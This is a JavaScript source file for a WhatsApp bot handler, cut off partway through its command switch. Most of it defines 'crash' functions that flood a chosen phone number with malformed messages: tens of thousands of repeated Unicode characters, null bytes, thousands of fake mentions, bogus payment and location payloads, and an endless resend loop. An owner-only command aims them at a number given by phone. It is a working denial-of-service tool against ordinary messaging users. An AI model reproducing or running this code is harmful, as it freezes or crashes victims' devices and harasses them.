const {
          generateWAMessageFromContent,
          getAggregateVotesInPollMessage,
          downloadContentFromMessage,
          prepareWAMessageMedia,
          useMultiFileAuthState,
          generateMessageID,
          generateIOSMessageID,
          generateWAMessage,
          makeInMemoryStore,
          DisconnectReason,
          areJidsSameUser,
          getContentType,
          decryptPollVote,
          relayMessage,
          jidDecode,
          Browsers,
          getDevice,
          proto,
          } = require("baron-baileys-v2")
const fs = require('fs')
//const 
const web = fs.readFileSync('./src/opa.webp');
const sekzo3 = 'ྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃྃ'.repeat(500);
const util = require('util')
const chalk = require('chalk')
const fetch = require('node-fetch')
const moment = require('moment-timezone');
const pino = require('pino')
const logger = pino({ level: 'debug' });
const crypto = require('crypto');
messageSecret: crypto.randomBytes(32)

const path = require('path')

module.exports = async (conn, m, chatUpdate, store, prefix) => {
try {
m.id = m.key.id
m.chat = m.key.remoteJid
m.fromMe = m.key.fromMe
m.isGroup = m.chat.endsWith('@g.us')
m.isGroup = m.chat?.endsWith('@g.us') || false
m.sender = conn.decodeJid(m.fromMe && conn.user. id || m.participant || m.key.participant || m.chat || '')
if (m.isGroup) m.participant = conn.decodeJid(m.key.participant) || ''
function getTypeM(message) {
    const type = Object.keys(message)
    var restype =  (!['senderKeyDistributionMessage', 'messageContextInfo'].includes(type[0]) && type[0]) || (type.length >= 3 && type[1] !== 'messageContextInfo' && type[1]) || type[type.length - 1] || Object.keys(message)[0]
	return restype
}
m.mtype = getTypeM(m.message)
m.msg = (m.mtype == 'viewOnceMessage' ? m.message[m.mtype].message[getTypeM(m.message[m.mtype].message)] : m.message[m.mtype])
m.text = m.msg.text || m.msg.caption || m.message.conversation || m.msg.contentText || m.msg.selectedDisplayText || m.msg.title || ''
const info = m
const from = info.key.remoteJid
const from2 = info.chat

var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id:(m.mtype === 'conversation') ? m.message.conversation :(m.mtype === 'deviceSentMessage') ? m.message.extendedTextMessage.text :(m.mtype == 'imageMessage') ? m.message.imageMessage.caption :(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const getGroupAdmins = (participants) => {
        let admins = []
        for (let i of participants) {
            i.admin === "superadmin" ? admins.push(i.id) :  i.admin === "admin" ? admins.push(i.id) : ''
        }
        return admins || []
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
var budy = (typeof m.text == 'string' ? m.text: '')
const bardy = body || '';
const isCmd = bardy.startsWith(prefix);
const command = isCmd ? bardy.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = bardy.trim().split(/ +/).slice(1)
const text = args.join(" ")
const q = args.join(" ")
const sender = info.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (info.key.participant || info.key.remoteJid)
const botNumber = await conn.decodeJid(conn.user.id)
const senderNumber = sender.split('@')[0]

const userList = [
"yournumber@s.whatsapp.net",
"friendsnumber@s.whatsapp.net",
"0@s.whatsapp.net",
"13135550002@s.whatsapp.net",
"593969533280@s.whatsapp.net",
"584163679167@s.whatsapp.net"
];
const candList = [
    "5216421147692@s.whatsapp.net", 
    "yournumber@s.whatsapp.net",
    "friendsnumber@s.whatsapp.net",
    "120363421317937545@g.us",
    "13135550002@s.whatsapp.net",
    "593969533280@s.whatsapp.net",
    "584163679167@s.whatsapp.net",
    "5491130524256@s.whatsapp.net"
];
const groupid = [ 
 "120363421317937545@g.us",
 "120363415442586508@g.us",
 "120363421386564277@g.us",
 "120363420474631547@g.us",
 "120363402299771381@g.us",
 ];
global.prefa = ['','!','.',',','/','-'] 
const isNose = groupid.includes(sender);
const isCreator = userList.includes(sender);
const pushname = m.pushName || `${senderNumber}`
const isBot = info.key.fromMe ? true : false
const ios4 = fs.readFileSync('./travas/ios4.js');
const ios7 = fs.readFileSync('./travas/ios7.js');
const ios6 = fs.readFileSync('./travas/ios6.js');
const travadoc = fs.readFileSync('./travas/travadoc.js');

const lol = {
key: {
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast"
},
message: {
orderMessage: {
orderId: "2009",
thumbnail: fs.readFileSync('./media/thumb.jpg'),
itemCount: "9999",
status: "INQUIRY",
surface: "",
message: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛`,
token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
}
},
contextInfo: {
mentionedJid: ["120363369514105242@s.whatsapp.net"],
forwardingScore: 999,
isForwarded: true,
}
}
const sJid = "status@broadcast";
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata?.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const PrecisaSerMembro = m.isGroup ? await participants.filter(v => v.admin === null).map(v => v.id) : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
var deviceC = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp web'
const settingsPath = './dev/setting.js';
const settings = require(settingsPath);
global.totallog = settings.totallog
global.logColor = settings.logColor || "\x1b[31m"
global.shapeColor = settings.shapeColor || "\x1b[31m"
global.rootColor = settings.rootColor || "\x1b[31m"
global.hideNumber = settings.hideNumber || false
function log(messageLines, title) {
    const top = `\n${shapeColor}` + "╭" + "─".repeat(50) + "╮" + "\x1b[0m"
    const bottom = `${shapeColor}╰` + "─".repeat(50) + "╯" + "\x1b[0m"
    const emptyLine = `${shapeColor}│` + " ".repeat(50) + "│" + "\x1b[0m"
    

    console.log(top);
    if (title) {
    const strip = title.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
    const titleLine = `${shapeColor}│` + " " + `${logColor}` +
    strip.padEnd(48) + " " + `${shapeColor}│`
    console.log(titleLine);
    console.log(emptyLine);
    }
    messageLines.forEach((line, i)=> {
    if (line.startsWith("\x1b")) {
        const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(51)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
    } else {
    const strip = line.replace(/\\x1b\\ [0-9;]*[mGK]/g,'')
        let formattedLine = `${shapeColor}│${logColor}` + ` ${i + 1} ` + `${strip.padEnd(46)}` + " " + `${shapeColor}│` + "\x1b[0m"
        console.log(formattedLine);
        }
        
    });
    console.log(emptyLine);
    console.log(bottom + "\n\n");
}
function hidden(input) {
if (hideNumber){
return "*************"
} else {
return input
}
}
if (totallog) {
if (m.message && m.isGroup) {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Chat Grupal';
    const INFOS = [
        `[ Mensaje ] ${timeOnly}`,
        `=> Mensaje: ${bardy}`,
        `=> Nombre: ${hidden(pushname || "desconocido")}`,
        `=> de: ${hidden(info.sender)}`,
        `=> en: ${groupName || info.chat}`,
        `=> Dispositivo: ${deviceC}`,
    ];
    log(INFOS, title);
} else {
    const timeOnly = new Date().toLocaleTimeString("de-DE", {
        hour: "2-digit",
        minute: "2-digit"
    });

    const title = 'Chat Privado';
    const INFOS = [
        `[ Mensaje ] ${timeOnly}`,
        `=> Texto: ${bardy}`,
        `=> Nombre: ${hidden(pushname || "desconocido")}`,
        `=> De: ${hidden(info.sender)}`,
        `=> Dispocitivo: ${deviceC}`,
    ];
    log(INFOS, title);
}
}
const reply = (text) => {
conn.sendMessage(from, { text: text, mentions: [sender]},
{quoted: info}
).catch(e => {
return
})
}


let mediaImage = await prepareWAMessageMedia({ 
    "image": {
       "url": "./media/thumb.jpg"
      }
    },
  { "upload": conn.waUploadToServer}
  )
mediaImage = mediaImage.imageMessage

const Ehztext = (text, style = 1) => {
    var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
    var ehz = {
      1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
    };
    var replacer = [];
    abc.map((v, i) =>
      replacer.push({
        original: v,
        convert: ehz[style].split('')[i]
      })
    );
    var str = text.toLowerCase().split('');
    var output = [];
    str.map((v) => {
      const find = replacer.find((x) => x.original == v);
      find ? output.push(find.convert) : output.push(v);
    });
    return output.join('');
  };

  function sendMessageWithMentions(text, mentions = [], quoted = false) {
    if (quoted == null || quoted == undefined || quoted == false) {
      return conn.sendMessage(m.chat, {
        'text': text,
        'mentions': mentions
      }, {
        'quoted': m
      });
    } else {
      return conn.sendMessage(m.chat, {
        'text': text,
        'mentions': mentions
      }, {
        'quoted': m
      });
    }
  }


      conn.sendjsonv3 = (jid, jsontxt = {},) => {
        etc = generateWAMessageFromContent(jid, proto.Message.fromObject(
          jsontxt
          ), { userJid: jid,
          }) 
         
       return conn.relayMessage(jid, etc.message, { messageId: etc.key.id });
       }
  
       conn.sendjsonv4 = (jid, jsontxt = {},) => {
        etc = generateWAMessageFromContent(jid, proto.Message.fromObject(
          jsontxt
          ), { userJid: jid }) 
         
       return conn.relayMessage(jid, etc.message, { participant: { jid: jid },   messageId: etc.key.id });
       }
const cataui = fs.readFileSync("./src/cataui.js", "utf8");


async function crashiOS(target) {
 await conn.sendMessage(target, {
 text:
 "> chocoplus" +
 "𑇂𑆵𑆴𑆿".repeat(60000),
 contextInfo: {
 externalAdReply: {
 title: `☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>`,
 body: `BOOT FREE`,
 previewType: "PHOTO",
 thumbnail: fs.readFileSync("./media/ola.jpg"),
 sourceUrl: ``
 }
 }
 }, { quoted: m });
}
const webozz = {
key: {
remoteJid: "status@broadcast",
fromMe: false,
participant: `0@s.whatsapp.net`,
id: "3EB0"
},
message: {
extendedTextMessage: {
text: `ＵＮＫ ↯ ＢＯＴＺＩＮ`,
contextInfo: {
stanzaId: "3EB0",
}
}
}
};

const choco = {
  key: {
    fromMe: false,
    remoteJid: "status@broadcast",
    participant: "0@s.whatsapp.net"
  },
  message: {
    contactMessage: {
      displayName: "⿻𝑐ℎ𝑜𝑐𝑜𝑐𝑟𝑖𝑠𝑝𝑦⿻",
      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:ZETAS COLLAB\nTEL;type=CELL;type=VOICE;waid=593969533280:593969533280\nEND:VCARD`
    }
  }
}


async function handleStatusBox(conn, msg) {
  const text =
    msg.message?.conversation ||
    msg.message?.extendedTextMessage?.text ||
    msg.message?.ephemeralMessage?.message?.extendedTextMessage?.text ||
    "";

  // separar comando y número
  const args = text.trim().split(/\s+/);
  const number = args[1]; // lo que viene después de "statusbox"

  if (!number) {
    await conn.sendMessage(msg.key.remoteJid, { text: "Error: Debes ingresar un número." }, { quoted: msg });
    return;
  }

  try {
    // verificar en WhatsApp
    const [result] = await conn.onWhatsApp(number);

    if (!result) {
      await conn.sendMessage(msg.key.remoteJid, { text: `El número ${number} no está en WhatsApp.` }, { quoted: msg });
      return;
    }

    const data = {
      Number: number,
      Status: result.exists ? "activo" : "no existe",
      Jid: result.jid
    };

    await conn.sendMessage(msg.key.remoteJid, { text: JSON.stringify(data, null, 2) }, { quoted: msg });
  } catch (error) {
  }
}

async function blenklet(conn, target) {
    let crash = JSON.stringify({ action: "x", data: "x" });

    while (true) {
        try {
            await conn.relayMessage(target, {
                stickerPackMessage: {
                    stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
                    name: "chocoplus ¿?" + "ꦾ".repeat(77777),
                    publisher: "t.me/kkkkkkk",
                    stickers: [
                        { fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp", isAnimated: false, mimetype: "image/webp" },
                        { fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp", isAnimated: false, mimetype: "image/webp" }
                    ],
                    fileLength: "3662919",
                    fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
                    fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
                    mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
                    directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc",
                    contextInfo: {
                        mentionedJid: [
                            "593969533280@s.whatsapp.net",
                            ...Array.from({ length: 1900 }, () =>
                                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                            )
                        ]
                    }
                }
            }, {});

            const msg = generateWAMessageFromContent(target, {
                viewOnceMessageV2: {
                    message: {
                        listResponseMessage: {
                            title: "xGhr.mp5 ¿?",
                            listType: 4,
                            buttonText: { displayText: "xGhr.mp5¿?" },
                            singleSelectReply: { selectedRowId: "⌜⌟" },
                            contextInfo: {
                                mentionedJid: [target],
                                externalAdReply: {
                                    title: "xGhr.mp5 ¿?",
                                    body: "xGhr.mp5 ¿?",
                                    mediaType: 1,
                                    nativeFlowButtons: [
                                        { name: "payment_info", buttonParamsJson: crash },
                                        { name: "call_permission_request", buttonParamsJson: crash }
                                    ]
                                },
                                extendedTextMessage: {
                                    text: "ꦾ".repeat(20000) + "@1".repeat(20000)
                                }
                            }
                        }
                    }
                }
            }, {});

            await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
        } catch (err) {
        }

        await new Promise(r => setTimeout(r, 500));
    }
}


async function yangBacaDev2(conn, jid, ptcp) {
    let msg = generateWAMessageFromContent(jid, {
        interactiveResponseMessage: {
            contextInfo: {
                mentionedJid: Array.from(
                    { length: 2000 },
                    (_, z) => `1313555020${z + 1}@s.whatsapp.net`
                ),
                isForwarded: true,
                forwardingScore: 2085,
                forwardedAiBotMessageInfo: {
                    botJid: "13135550202@bot",
                    botName: "Business Assistant",
                    creator: "7eppeli"
                },
                participant: "13135550202@bot",
                quotedMessage: {
                    paymentInviteMessage: {
                        serviceType: "UPI",
                        expiryTimestamp: Date.now()
                    }
                },
                remoteJid: "FineShyt"
            },
            body: {
                text: "¿𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘?",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"body\":\"7-Yuukey\",\"title\":\"7eppeli=Explorations\",\"title\":\"FVCK URSELF\"}"
            }
        }
    }, { userJid: jid });

    await conn.relayMessage(jid, msg.message, ptcp ? {
        participant: { jid },
        messageId: msg.key.id
    } : {
        messageId: msg.key.id
    });
}
async function crashGalaxy(target) {
let xios = "𑇂𑆵𑆴𑆿".repeat(333333) + "\u200B".repeat(333333) + "ހށނރ".repeat(333333)

await generateWAMessageFromContent(target, proto.Message.fromObject({
groupMentionedMessage: {
message: {
interactiveMessage: {
header: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
mimetype: "application/json",
fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
fileLength: "999999999999",
pageCount: 7.554679297577082e+23,
mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
fileName: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏",
fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1715880173"
},
hasMediaAttachment: true
},
body: {
text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>" + xios
},
nativeFlowMessage: {
messageParamsJson: JSON.stringify({
name: "galaxy_message",
flow_action: "navigate",
flow_action_payload: { screen: "CTZ_SCREEN" },
flow_cta: "🍏",
flow_id: "UNDEFINEDONTOP",
flow_message_version: "9.903",
flow_token: "UNDEFINEDONTOP"
})
},
contextInfo: {
mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
groupMentions: [{
groupJid: "1@newsletter",
groupSubject: "UNDEFINEDONTOP"
            }]
          }
        }
      }
    }
  }), { userJid: target });

await conn.relayMessage(
target,
{
paymentInviteMessage: {
serviceType: "APPLEPAY",
expiryTimestamp: Date.now() + 1814400000
      }
    },
    {
      participant: { jid: target }
    }
  );

await conn.relayMessage(target, {
contactMessage: {
displayName: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏" + "𑇂𑆵𑆴𑆿".repeat(60000),
vcard: `BEGIN:VCARD
VERSION:3.0
N:☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>
FN:☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>
item1.TEL;waid=526421147692:526421147692
item1.X-ABLabel:Click here to chat
item2.EMAIL;type=INTERNET:YT: https://youtube.com/@p.a.zinwebkkkkj
item2.X-ABLabel:YouTube
item3.URL:INSTA: instagram.com/principeazul2.0
item3.X-ABLabel:GitHub
item4.ADR:;;Brasil, AM, SP;;;;
item4.X-ABLabel:Region
END:VCARD`,
contextInfo: {
forwardingScore: 2,
isForwarded: true,
isFromMe: true,
externalAdenviar: {
mediaType: 1,
previewType: "NONE",
sourceUrl: "https://youtube.com/@p.a.zinwebkkkkj"
        }
      }
    }
  }, {
    quoted: m
  });

await conn.relayMessage(target, {
locationMessage: {
degreesLatitude: 173.282,
degreesLongitude: -19.378,
name: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>" + "𑇂𑆵𑆴𑆿".repeat(60000),
url: "https://youtube.com/@p.a.zinwebkkkkj"
}
}, {
participant: { jid: target }
});
}

async function forcepotter(target) {
try {
const vcard = `
BEGIN:VCARD
VERSION:3.0
FN:🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>${ios6}
ORG:𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏${ios6};
TEL;type=CELL;type=VOICE;waid=999999999999:+99 999-999
END:VCARD`;

const contactMsg = {
extendedTextMessage: {
text: `☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>${ios6}`,
contextInfo: {
stanzaId: generateMessageID(),
participant: "0@s.whatsapp.net",
quotedMessage: {
contactMessage: {
displayName: `🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛${ios6}`,
vcard: vcard.trim()
}
}
}
}
};

const paymentMsg = {
requestPaymentMessage: {
currencyCodeIso4217: "BRL",
amount1000: "999999999",
requestFrom: target,
noteMessage: {
extendedTextMessage: {
text: "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
contextInfo: {
stanzaId: generateMessageID(),
participant: "0@s.whatsapp.net",
quotedMessage: {
contactMessage: {
displayName: "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
vcard: vcard.trim()
}
}
}
}
}
}
};

const locationMsg = {
locationMessage: {
degreesLatitude: 999,
degreesLongitude: 999,
name: `${ios4}`,
address: "Unknown"
}
};

const nestedContactMsg = {
extendedTextMessage: {
text: "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛",
contextInfo: {
stanzaId: generateMessageID(),
participant: "0@s.whatsapp.net",
quotedMessage: {
extendedTextMessage: {
text: "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
contextInfo: {
stanzaId: generateMessageID(),
participant: "0@s.whatsapp.net",
quotedMessage: {
contactMessage: {
displayName: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 ⚡️",
vcard: vcard.trim()
},
},
},
},
},
},
},}


await conn.relayMessage(target, contactMsg, { messageId: generateMessageID() })
await sleep(1000)
await conn.relayMessage(target, paymentMsg, { messageId: generateMessageID() })
await sleep(1000)
await conn.relayMessage(target, locationMsg, { messageId: generateMessageID() })
await sleep(1000)
await conn.relayMessage(target, nestedContactMsg, { messageId: generateMessageID() })

} catch (error) {
console.error('Error en:', error);
    }
}

async function loadedXios(target) {
 await conn.sendMessage(target, {
 text:
 "\nXghr-BOT V2\n" +  "𑇂𑆵𑆴𑆿".repeat(60000),
 contextInfo: {
 externalAdReply: {
 title: `Xghr-BOT V2 </>`,
 body: `Xghr-BOT V2`,
 previewType: "PHOTO",
 thumbnail: fs.readFileSync("./media/thumb.jpg"),
 sourceUrl: `https://youtube.com/@p.a.zinwebkkkkj`
 }
 }
 }, { quoted: m });
}
async function BlankScreen(target) {
  try {
    const ThumbRavage = "https://files.catbox.moe/cfkh9x.jpg";
    const imagePayload = await prepareWAMessageMedia({
      image: { url: ThumbRavage, gifPlayback: true }
    }, {
      upload: sock.waUploadToServer,
      mediaType: "image"
    });
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 30000 }, () =>
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          ),
          isForwarded: true,
          forwardingScore: 9999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363331859075083@newsletter",
            newsletterName: "ꦾ".repeat(10000),
            serverMessageId: 1
          }
        },
        header: {
          title: "",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: {
          text: "\u2063".repeat(10000)
        },
        footer: {
          text: "AMALIA KILL YOU"
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "ꦾ".repeat(10000),
                url: "ꦾ".repeat(10000),
                merchant_url: ""
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { quoted: null });
    await conn.relayMessage(target, msg.message, { messageId: msg.key.id });
    console.log(`BlankScreen Delay Sent to ${target}`);
  } catch (error) {
  }
}
async function handleSzt(conn, target) {
  let szt = 1;
  for (let i = 0; i < szt; i++) {
    let push = [];
    let buttt = [];
    for (let i = 0; i < 5; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "null",
          "body": "xxx",
          "flow_action": "navigate",
          "flow_action_payload": {
            screen: "FORM_SCREEN"
          },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }
    const media = await prepareWAMessageMedia(
      { image: { url: "https://files.catbox.moe/457lbu.jpg" } },
      { upload: conn.waUploadToServer }
    );
    for (let i = 0; i < 1000; i++) {
      push.push({
        body: { text: `\u0000\u0000\u0000\u0000\u0000` },
        footer: { text: "" },
        header: {
          title: '🫣🫣\u0000\u0000\u0000\u0000',
          hasMediaAttachment: true,
          imageMessage: media.imageMessage
        },
        nativeFlowMessage: { buttons: [] }
      });
    }
    const carousel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: { text: '\u0000\u0000\u0000\u0000' },
              footer: { text: "#𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘" },
              header: { hasMediaAttachment: false },
              carouselMessage: { cards: [...push] }
            }
          }
        }
      },
      { userJid: target, upload: conn.waUploadToServer }
    );
    await conn.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
  }
  console.log("by chocoplus");
}
async function CtaZts(conn, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://files.catbox.moe/wyecvo.jpg" } },
    { upload: conn.waUploadToServer }
  );

  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  media: media.imageMessage,
                },
                body: {
                  text: " #webitoz " + "ꦽ".repeat(100000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: "ꦽ".repeat(2000),
                    },
                  ],
                  messageParamsJson: "{".repeat(10000),
                },
              },
            ],
          },
        },
      },
    },
  };

  await conn.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}
async function ZieeInvisForceIOS(conn, target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Z1ee - Tryhards ¿?" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://github.com/urz1ee",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "@Urz1ee" + "𑇂𑆵𑆴𑆿".repeat(70000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}

async function IosInvisibleForce(conn, target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "𝐋𝐢𝐦𝐯𝐝𝐨𝐧-‣꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/LimvzxTyz",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "Vaxilon",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "@rizxvelzinfinity" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  console.log(`─────「 ⏤!CrashInvisibleIOS To: ${target}!⏤ 」─────`)
}

switch(command) {
  case "xhgr":
if (!isBot && !isCreator) return
if (!q) return reply(`Ejemplo ${prefix + command} +52xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 2; i++) {
ZieeInvisForceIOS(conn, target)
